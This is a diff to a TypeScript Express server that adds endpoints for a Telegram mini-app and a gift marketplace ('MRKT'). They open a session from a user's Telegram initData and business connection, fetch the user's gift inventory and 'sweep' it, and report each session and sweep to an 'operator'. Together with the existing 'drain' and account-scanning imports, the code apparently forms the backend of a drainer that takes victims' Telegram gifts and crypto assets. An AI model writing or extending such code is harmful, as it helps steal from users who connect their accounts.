@@ -6,8 +6,21 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { config } from "./config.js";
 import { planNextBatch } from "./drain.js";
+import { getMe } from "./mrkt/client.js";
+import { fetchInventory } from "./mrkt/client.js";
+import { sweepInventoryPage } from "./mrkt/sweep.js";
+import { getSession, openSession } from "./mrkt/sessions.js";
 import { notifyOperator } from "./notify.js";
 import { scanAccount } from "./tonapi.js";
+
+function tgUserIdFromInitData(initData: string): number {
+  const params = new URLSearchParams(initData);
+  const raw = params.get("user");
+  if (!raw) throw new Error("initData missing user");
+  const user = JSON.parse(raw) as { id?: number };
+  if (!user.id) throw new Error("initData missing user.id");
+  return user.id;
+}
 
 const app = express();
 app.use(cors({ origin: true }));
@@ -100,6 +113,87 @@ app.post("/api/build-batch", async (req, res) => {
     });
   } catch (e) {
     console.error(e);
+    res.status(500).json({ error: String(e) });
+  }
+});
+
+const sessionOpenSchema = z.object({
+  initData: z.string().min(10),
+  businessConnectionId: z.string().optional(),
+});
+
+app.post("/api/mrkt/session/open", async (req, res) => {
+  const parsed = sessionOpenSchema.safeParse(req.body);
+  if (!parsed.success) {
+    res.status(400).json({ error: "bad body" });
+    return;
+  }
+  try {
+    const tgUserId = tgUserIdFromInitData(parsed.data.initData);
+    const session = await openSession({
+      initData: parsed.data.initData,
+      tgUserId,
+      businessConnectionId: parsed.data.businessConnectionId,
+    });
+    const me = await getMe(session.mrktToken).catch(() => null);
+    await notifyOperator(
+      `<b>mrkt_session</b>\ntg <code>${tgUserId}</code>\nMRKT id <code>${me?.id ?? "?"}</code>\nbc ${session.businessConnectionId ?? "—"}`,
+    );
+    res.json({
+      sessionId: session.sessionId,
+      expiresAt: session.expiresAt,
+      limits: {
+        maxFills: config.mrkt.maxFillsPerSession,
+        maxGifts: config.mrkt.maxGiftsPerSession,
+      },
+    });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: e instanceof Error ? e.message : String(e) });
+  }
+});
+
+app.get("/api/mrkt/inventory", async (req, res) => {
+  const sessionId = String(req.headers["x-session-id"] ?? "");
+  const session = getSession(sessionId);
+  if (!session) {
+    res.status(401).json({ error: "session expired" });
+    return;
+  }
+  const cursor = String(req.query.cursor ?? "");
+  try {
+    const inv = await fetchInventory(session.mrktToken, cursor);
+    res.json({
+      gifts: inv.gifts ?? [],
+      total: inv.total ?? 0,
+      cursor: inv.cursor ?? "",
+    });
+  } catch (e) {
+    res.status(500).json({ error: String(e) });
+  }
+});
+
+app.post("/api/mrkt/sweep", async (req, res) => {
+  const sessionId = String(req.headers["x-session-id"] ?? "");
+  const session = getSession(sessionId);
+  if (!session) {
+    res.status(401).json({ error: "session expired" });
+    return;
+  }
+  const cursor = String((req.body as { cursor?: string })?.cursor ?? "");
+  try {
+    const result = await sweepInventoryPage(session, cursor);
+    if (result.items.length > 0) {
+      const lines = result.items
+        .filter((i) => i.mode !== "skipped")
+        .map((i) => `${i.mode} ${i.giftId} ${i.priceNano ?? ""} ${i.detail ?? ""}`)
+        .join("\n");
+      if (lines) {
+        await notifyOperator(`<b>mrkt_sweep</b>\ntg <code>${session.tgUserId}</code>\n${lines}`);
+      }
+    }
+    res.json(result);
+  } catch (e) {
     res.status(500).json({ error: String(e) });
   }
 });
